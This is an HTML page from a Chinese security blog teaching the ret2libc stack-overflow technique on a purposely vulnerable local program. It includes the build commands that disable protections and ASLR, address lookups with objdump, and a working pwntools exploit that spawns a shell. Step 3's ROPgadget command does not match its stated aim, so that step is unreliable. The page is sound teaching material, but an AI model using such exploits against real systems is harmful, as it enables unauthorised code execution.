@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  
+  <title>
+    栈溢出之ret2libc | Leticia‘s Blog 
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+  <meta name="author" content="麻薯">
+
+
+
+  <meta name="keywords" content=",rop">
+<meta name="description" content="前言本篇接着前几篇的进度介绍另一种基本ROP方法：ret2libc
+ret2libc原理libc是Linux下的ANSI C的函数库，ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。ret2libc类比之前介绍的三种方法，从字面意思看就是控制返回地址找libc中库函数存在的方法。
+一般情况下，我们使用ret2libc主要针对动态链接编译的程序，程序动态链接了libc.so等动态链接库">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出之ret2libc | Leticia‘s Blog">
+<meta property="og:url" content="http://yoursite.com/2020/02/27/栈溢出之ret2libc/index.html">
+<meta property="og:site_name" content="Leticia‘s Blog">
+<meta property="og:description" content="前言本篇接着前几篇的进度介绍另一种基本ROP方法：ret2libc
+ret2libc原理libc是Linux下的ANSI C的函数库，ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。ret2libc类比之前介绍的三种方法，从字面意思看就是控制返回地址找libc中库函数存在的方法。
+一般情况下，我们使用ret2libc主要针对动态链接编译的程序，程序动态链接了libc.so等动态链接库">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc01.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc02.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc03.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc04.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc05.png">
+<meta property="og:updated_time" content="2020-02-27T12:45:13.537Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="栈溢出之ret2libc | Leticia‘s Blog">
+<meta name="twitter:description" content="前言本篇接着前几篇的进度介绍另一种基本ROP方法：ret2libc
+ret2libc原理libc是Linux下的ANSI C的函数库，ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。ret2libc类比之前介绍的三种方法，从字面意思看就是控制返回地址找libc中库函数存在的方法。
+一般情况下，我们使用ret2libc主要针对动态链接编译的程序，程序动态链接了libc.so等动态链接库">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc01.png">
+
+  <!-- favicon icon files -->
+
+  <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+  <link rel="icon" href="/images/favicon.ico">
+
+  <!-- css files -->
+  <link rel="stylesheet" href="/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/css/uno.css">
+  <link rel="stylesheet" href="/css/tagscloud.css">
+  <link rel="stylesheet" href="/css/links.css">
+  <link rel="stylesheet" href="/css/archive.css">
+  <link rel="stylesheet" href="/css/jquery.fancybox.css">
+  <link href="//cdn.bootcss.com/highlight.js/9.8.0/styles/monokai-sublime.min.css" rel="stylesheet">
+  <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+</head>
+<body>
+  <!-- mobile menu -->
+  <span class="mobile btn-mobile-menu">
+    <i class="fa btn-mobile-menu__icon fa-bars" aria-hidden="true"></i>
+  </span>
+  <!-- side panel -->
+  
+  <header class="panel-cover panel-cover--collapsed">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+      
+        <a href="/" title="link to homepage for Leticia‘s Blog"><img src="/images/avatar.jpg" width="80" alt="Leticia‘s Blog logo" class="panel-cover__logo logo" /></a>
+      
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">麻薯</a></h1>
+        <hr class="panel-cover__divider" />
+        
+        <p class="panel-cover__description">
+          She will never see the day it blossoms,maybe.
+        </p>
+        <hr class="panel-cover__divider" />
+        
+        <!-- TagsCloud -->
+        
+
+  <div id="tagscloud">
+<a href="/tags/渗透测试/" class="tagc1">渗透测试 : 40</a><a href="/tags/笔记/" class="tagc2">笔记 : 14</a><a href="/tags/python/" class="tagc3">python : 14</a><a href="/tags/机器学习/" class="tagc4">机器学习 : 13</a><a href="/tags/php/" class="tagc5">php : 10</a><a href="/tags/mysql/" class="tagc1">mysql : 7</a><a href="/tags/网络安全/" class="tagc2">网络安全 : 5</a><a href="/tags/sql注入/" class="tagc3">sql注入 : 5</a><a href="/tags/暴力破解/" class="tagc4">暴力破解 : 4</a><a href="/tags/rop/" class="tagc5">rop : 4</a><a href="/tags/工具配置/" class="tagc1">工具配置 : 3</a><a href="/tags/ctf/" class="tagc2">ctf : 3</a><a href="/tags/文件上传/" class="tagc3">文件上传 : 3</a><a href="/tags/XSS/" class="tagc4">XSS : 2</a><a href="/tags/代码审计/" class="tagc5">代码审计 : 2</a><a href="/tags/shell/" class="tagc1">shell : 2</a><a href="/tags/linux/" class="tagc2">linux : 2</a><a href="/tags/内网渗透/" class="tagc3">内网渗透 : 2</a><a href="/tags/密码学/" class="tagc4">密码学 : 2</a><a href="/tags/逻辑处理漏洞/" class="tagc5">逻辑处理漏洞 : 2</a>
+</div>
+
+        <div class="navigation-wrapper">
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+            
+              
+              <li class="navigation__item"><a href="/#blog" title="" class="blog-button">博客</a></li>
+            
+              
+              <li class="navigation__item"><a href="/archive/" title="" class="">归档</a></li>
+            
+              
+              <li class="navigation__item"><a href="/links/" title="" class="">友链</a></li>
+            
+            </ul>
+          </nav>
+          
+<hr class="panel-cover__divider">
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/echohun" title="麻薯's GitHub">
+          <i class='fa fa-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+    
+    
+  </ul>
+</nav>
+
+        </div>
+      </div>
+    </div>
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+  <div class="content-wrapper">
+    <div class="content-wrapper__inner entry">
+      <!-- body panel -->
+      
+<article class="post-container post-container--single">
+  <header class="post-header">
+    <h1 class="post-title">栈溢出之ret2libc</h1>
+    
+    <div class="post-meta">
+      <time datetime="2020-02-27 20:44:04" class="post-meta__date date">2020-02-27 20:44:04</time> 
+      <span class="post-meta__tags tags">
+      
+        <font class="categories">&#8226; 分类:
+        <a class="categories-link" href="/categories/二进制/">二进制</a>
+        </font>
+      
+      
+        &#8226; 标签:
+        <font class="tags">
+        <a class="tags-link" href="/tags/rop/">rop</a>
+        </font>
+      
+      </span>
+    </div>
+    
+  </header>
+  <section id="post-content" class="article-content post">
+  <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇接着前几篇的进度介绍另一种基本ROP方法：ret2libc</p>
+<h2 id="ret2libc原理"><a href="#ret2libc原理" class="headerlink" title="ret2libc原理"></a>ret2libc原理</h2><p>libc是Linux下的ANSI C的函数库，ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。ret2libc类比之前介绍的三种方法，从字面意思看就是控制返回地址找libc中库函数存在的方法。</p>
+<p>一般情况下，我们使用ret2libc主要针对动态链接编译的程序，程序动态链接了libc.so等动态链接库，虽然程序本身并没有用到system等危险函数，但是动态链接库中存在大量的可利用函数，就产生了新的攻击方式，从这些动态链接库中找可利用片段，拼接成恶意代码并控制rip跳转执行。</p>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#undef _FORTIFY_SOURCE</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">void vulnerable_function() &#123;</div><div class="line">	char buf[128];</div><div class="line">	read(STDIN_FILENO, buf, 256);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">	vulnerable_function();</div><div class="line">	write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>关闭掉地址随机化和栈保护进行编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc ret2libc.c -g -fno-stack-protector -no-pie -o ret2libc64</div><div class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</div></pre></td></tr></table></figure></p>
+<h2 id="ROP过程"><a href="#ROP过程" class="headerlink" title="ROP过程"></a>ROP过程</h2><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>使用gdb的checksec查看安全机制</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc01.png" alt=""></p>
+<p>分析程序，read buf局部变量时存在栈溢出问题，但是从题目中直接无法找到任何可利用的代码片段，也有NX保护无法直接执行shellcode，根据前面介绍的ret2libc原理，我们应该在程序的动态链接库里面寻找信息。</p>
+<p>设想，只要在动态链接库中找到system函数，再找到/bin/sh字符串，然后覆盖返回地址跳转到动态链接库的system函数控制执行/bin/sh指令就可以得到shell。</p>
+<h3 id="寻找信息"><a href="#寻找信息" class="headerlink" title="寻找信息"></a>寻找信息</h3><p>接下来就按照整理好的思路一步步获取信息，此次需要使用objdump来在动态链接库中寻找信息。</p>
+<p>1.ldd查看动态链接库</p>
+<p>ldd ret2libc64</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc02.png" alt=""></p>
+<p>可以看到使用了libc.so.6，libc库中存在大量的可利用函数，所以我们需要在它里面寻找。</p>
+<p>2.在动态链接库中寻找system地址</p>
+<p>objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep system</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc03.png" alt=""></p>
+<p>3.在动态链接库中寻找”/bin/sh”地址</p>
+<p>ROPgadget –binary ret2syscall –only “pop|ret” |grep ebx</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc04.png" alt=""></p>
+<p>4.找到可控局部变量到返回地址的偏移</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc05.png" alt=""></p>
+<p>0xfe290-0xfe210+0x8=0x88</p>
+<p>记录一下得到的信息：</p>
+<ul>
+<li>libc.so.6的基准地址是0x7fbf4cfcf000</li>
+<li>libc_system函数的偏移是0x435d0，那么它的实际地址就是0x7FBF4D0125D0</li>
+<li>/bin/sh字符串的偏移是0x17f573，那么它的实际地址就是0x7FBF4D14E573</li>
+<li>可控变量到返回地址的偏移是0x88</li>
+</ul>
+<p>接下来就可以构造payload了</p>
+<h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>首先分析payload构成，我们需要使返回地址指向system函数，然后system函数被调用时，rbp后面会紧跟着system的返回地址，然后再跟着system函数的入参，所以payload就是局部变量到返回地址的偏移padding1，然后libc_system的地址覆盖返回地址，后面接着一个8字节随意填充的padding2，再接上入参/bin/sh</p>
+<p>payload = padding1+system+padding2+”/bin/sh”</p>
+<p>payload =”A”*0x88+p64(system_addr)+p64(123)+p64(binsh_addr)</p>
+<p>然后写出exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">sh = process(&apos;./ret2libc64&apos;)</div><div class="line"></div><div class="line">system_addr = 0x7FBF4D0125D0</div><div class="line">binsh_addr = 0x7FBF4D14E573</div><div class="line">payload = &quot;A&quot;*0x88+p64(system_addr)+p64(123)+p64(binsh_addr)</div><div class="line">sh.sendline(payload)</div><div class="line">sh.interactive()</div></pre></td></tr></table></figure></p>
+<p>执行exp即可获取shell</p>
+
+  </section>
+  <div class="copyright">
+    <span>文本标题:</span><a href="/2020/02/27/栈溢出之ret2libc/" target="_blank">栈溢出之ret2libc</a><br />
+    <span>文章作者:</span><a href="/" title="回到主页" target="_blank">麻薯</a><br />
+    <span>发布时间:</span>2020-02-27 20:44:04<br />
+    <span>最后更新:</span>2020-02-27 20:45:13<br />
+    <span>原始链接:</span><a href="http://www.uuzdaisuki.com">www.uuzdaisuki.com</a><br />
+    <span>转载声明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。
+  </div>
+</article>
+      <!-- footer panel -->
+      <footer class="footer">
+	<center>
+    <span class="footer__copyright">&copy; 2016-2017. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/virink/vhuno">vHuno</a></span>
+    <span>本站采用<i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+    </center>
+</footer>
+    </div>
+  </div>
+  <!-- js files -->
+  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/js/main.js"></script>
+  <script src="/js/scale.fix.js"></script>
+  <script src="/js/tagcloud.js"></script>
+  
+  
+	<script src="/js/jquery.fancybox.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			$(".fancybox").fancybox({
+	            padding: 0,
+	            helpers: {
+	                overlay: {
+	                  locked: false
+	                }
+	            }
+	        });
+		});
+	</script>
+
+  
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+    MathJax.Hub.Config({ 
+        tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+    });
+});
+    </script>
+
+  <script src="//cdn.bootcss.com/highlight.js/9.8.0/highlight.min.js"></script>
+  <script src="/js/gallery.js"></script>
+  <script>
+  $(document).ready(function(){
+    hljs.initHighlightingOnLoad();
+  });
+  </script>
+  
+  
+<div id="totop" style="position: fixed; bottom: 50px; right: 30px; cursor: pointer; opacity: 1;">
+	<a title="back to top"><img style="width:30px;height:30px;" src="/images/totop.png"></a>
+</div>
+<script>
+    (function($) {
+        var upperLimit = 100;
+        var scrollElem = $('#totop');
+        var scrollSpeed = 500;
+        scrollElem.hide();
+        $(window).scroll(function() {
+            var scrollTop = $(document).scrollTop();
+            if (scrollTop > upperLimit) {
+                $(scrollElem).stop().fadeTo(300, 1); // fade back in
+            } else {
+                $(scrollElem).stop().fadeTo(300, 0); // fade out
+            }
+        });
+        $(scrollElem).click(function() {
+            $('html, body').animate({
+                scrollTop: 0
+            }, scrollSpeed);
+            return false;
+        });
+    })(jQuery);
+    </script>
+
+
+  <!-- Analytics Google -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-83885261-1', 'auto');
+  ga('send', 'pageview');
+</script>
+  
+    <script src="/js/jquery.githubRepoWidget.min.js"></script>
+
+  <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+</body>
+</html>
